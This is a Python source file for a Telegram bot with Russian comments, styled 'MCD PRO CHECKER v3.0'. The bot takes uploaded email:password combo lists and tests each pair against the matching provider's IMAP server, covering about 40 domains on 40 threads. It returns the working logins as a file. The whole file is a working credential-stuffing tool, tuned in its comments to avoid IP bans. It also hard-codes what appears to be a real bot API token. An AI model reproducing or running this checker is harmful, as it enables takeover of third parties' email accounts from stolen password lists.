import telebot
import imaplib
import threading
import time
import os
import socket
from concurrent.futures import ThreadPoolExecutor

# --- НАСТРОЙКИ ---
API_TOKEN = '8509142665:AAEiycyacUVbhq6-iZ1moMcv8lVKm4jQN6o'
MAX_THREADS = 40   # Оптимально для скорости без мгновенного бана по IP
TIMEOUT = 12       # Секунд на ответ сервера

bot = telebot.TeleBot(API_TOKEN)

# --- БАЗА IMAP (60+ популярных доменов) ---
IMAP_SERVERS = {
    'gmail.com': 'imap.gmail.com', 'yahoo.com': 'imap.mail.yahoo.com',
    'hotmail.com': 'outlook.office365.com', 'outlook.com': 'outlook.office365.com',
    'live.com': 'outlook.office365.com', 'msn.com': 'outlook.office365.com',
    'yandex.ru': 'imap.yandex.ru', 'ya.ru': 'imap.yandex.ru', 'yandex.com': 'imap.yandex.com',
    'mail.ru': 'imap.mail.ru', 'bk.ru': 'imap.mail.ru', 'inbox.ru': 'imap.mail.ru', 
    'list.ru': 'imap.mail.ru', 'internet.ru': 'imap.mail.ru',
    'rambler.ru': 'imap.rambler.ru', 'lenta.ru': 'imap.rambler.ru', 'autorambler.ru': 'imap.rambler.ru',
    'myrambler.ru': 'imap.rambler.ru', 'ro.ru': 'imap.rambler.ru',
    'gmx.com': 'imap.gmx.com', 'gmx.de': 'imap.gmx.net', 'web.de': 'imap.web.de',
    'icloud.com': 'imap.mail.me.com', 'me.com': 'imap.mail.me.com',
    'aol.com': 'imap.aol.com', 'zoho.com': 'imap.zoho.com',
    'mail.com': 'imap.mail.com', 't-online.de': 'secureimap.t-online.de',
    'orange.fr': 'imap.orange.fr', 'wanadoo.fr': 'imap.orange.fr',
    'laposte.net': 'imap.laposte.net', 'free.fr': 'imap.free.fr',
    'libero.it': 'imapmail.libero.it', 'virgilio.it': 'in.virgilio.it',
    'poczta.onet.pl': 'imap.poczta.onet.pl', 'wp.pl': 'imap.wp.pl',
    'o2.pl': 'poczta.o2.pl', 'interia.pl': 'poczta.interia.pl',
    'seznam.cz': 'imap.seznam.cz', 'comcast.net': 'imap.comcast.net',
    'verizon.net': 'imap.verizon.net', 'att.net': 'imap.mail.att.net'
}

def get_imap_host(email):
    domain = email.split('@')[-1].lower()
    return IMAP_SERVERS.get(domain, f"imap.{domain}")

def check_account(line):
    line = line.strip().replace(';', ':').replace('|', ':')
    if ':' not in line:
        return None, "FORMAT_ERR"
    
    try:
        email, password = line.split(':', 1)
        host = get_imap_host(email)
        
        # Попытка подключения (IMAP_SSL на порту 993)
        try:
            with imaplib.IMAP4_SSL(host, 993, timeout=TIMEOUT) as mail:
                mail.login(email, password)
                return f"{email}:{password}", "GOOD"
        except imaplib.IMAP4.error as e:
            if "auth" in str(e).lower() or "login" in str(e).lower():
                return None, "BAD"
            return None, "CONN_ERR"
        except (socket.timeout, socket.error):
            return None, "TIMEOUT"
    except Exception:
        return None, "ERROR"

def process_file_logic(message, file_path):
    chat_id = message.chat.id
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [l.strip() for l in f if l.strip()]
    
    os.remove(file_path)
    total = len(lines)
    
    # Красивое начальное сообщение
    status_msg = bot.send_message(chat_id, "⚙️ **Инициализация потоков...**", parse_mode="Markdown")
    
    goods = []
    bads = 0
    errors = 0
    checked = 0
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(check_account, line) for line in lines]
        
        for future in futures:
            result, status = future.result()
            checked += 1
            
            if status == "GOOD":
                goods.append(result)
            elif status == "BAD":
                bads += 1
            else:
                errors += 1

            # Обновляем UI каждые 15 чеков (чтобы ТГ не забанил за частые правки)
            if checked % 15 == 0 or checked == total:
                percent = int((checked / total) * 100)
                bar = "▓" * (percent // 10) + "░" * (10 - (percent // 10))
                elapsed = int(time.time() - start_time)
                speed = round(checked / elapsed, 1) if elapsed > 0 else 0
                
                ui_text = (
                    f"🚀 **MCD PRO CHECKER v3.0**\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Прогресс: `{percent}%`\n"
                    f"`{bar}`\n\n"
                    f"✅ Валид: `{len(goods)}` | ❌ Невалид: `{bads}`\n"
                    f"⚠️ Ошибки/Скип: `{errors}`\n"
                    f"📦 Всего в базе: `{total}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🚀 Скорость: `{speed}` акк/сек\n"
                    f"⏱ Прошло: `{elapsed}` сек."
                )
                try:
                    bot.edit_message_text(ui_text, chat_id, status_msg.message_id, parse_mode="Markdown")
                except:
                    pass

    # Финал
    if goods:
        res_file = f"Valid_{chat_id}.txt"
        with open(res_file, 'w') as f:
            f.write("\n".join(goods))
        with open(res_file, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"🏁 **Готово!**\nНайдено валида: `{len(goods)}` шт.")
        os.remove(res_file)
    else:
        bot.send_message(chat_id, "😔 **Результат:** Валидных аккаунтов не обнаружено.")

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "🔥 **Ready for work.**\nКидай файл `.txt` с базой (почта:пароль).", parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if not message.document.file_name.endswith('.txt'):
        return bot.reply_to(message, "⚠️ Принимаю только .txt файлы!")
    
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    path = f"base_{message.chat.id}.txt"
    with open(path, 'wb') as f:
        f.write(downloaded)
    
    threading.Thread(target=process_base_wrapper, args=(message, path)).start()

def process_base_wrapper(message, path):
    try:
        process_file_logic(message, path)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Произошла ошибка: {e}")

bot.polling(none_stop=True)

